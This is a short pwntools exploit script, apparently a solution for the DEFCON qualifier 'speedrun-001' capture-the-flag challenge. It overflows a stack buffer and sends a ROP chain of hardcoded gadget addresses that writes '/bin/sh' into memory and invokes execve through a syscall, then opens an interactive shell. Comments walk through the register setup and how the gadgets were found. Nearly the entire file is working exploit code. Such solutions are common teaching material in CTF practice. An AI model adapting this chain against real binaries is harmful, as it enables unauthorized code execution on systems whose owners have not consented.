# for DEFCON quals speedrun chall. binary included in this directory

from pwn import *
context.log_level = 'debug'

p = process("./speedrun-001")

# gdb broken, use IDA or something
buffer = b"A"*(1024 + 8)

# the execve syscall needs the following to execute
# rdi=filename(pointer to "/bin/sh\x00")
# rsi=0
# rdx=0
# rax=59 in hex(0x3b)
# call syscall

# to write something into the memory you need the "mov qword ptr" gadget
# such as "mov qword ptr [rax], rdx"
# this will move rdx to the address of rax
# I used ROPgadget --binary=speedrun-001 | grep ": mov qword ptr \[rax\]" | grep ret
# rax=mem
# rdx=string "/bin/sh\x00" in hex
# run mov gadget

# declaring gadgets
ret = p64(0x0000000000400416)
poprax = p64(0x0000000000415664)
poprdx = p64(0x00000000004498b5)
poprdi = p64(0x0000000000400686)
poprsi = p64(0x00000000004101f3)
movqword = p64(0x000000000048d251)
syscall = p64(0x000000000040129c)
binsh = p64(0x0068732f6e69622f)
mem = p64(0x00000000006b6000)
execve = p64(0x3b)

rop = b''
rop += buffer
#rop += ret
rop += poprax
rop += mem
rop += poprdx
rop += binsh
rop += movqword

rop += poprax
rop += p64(0x3b)
rop += poprdi
rop += mem
rop += poprsi
rop += p64(0)
rop += poprdx
rop += p64(0)

rop += syscall

p.sendline(rop)

p.interactive()
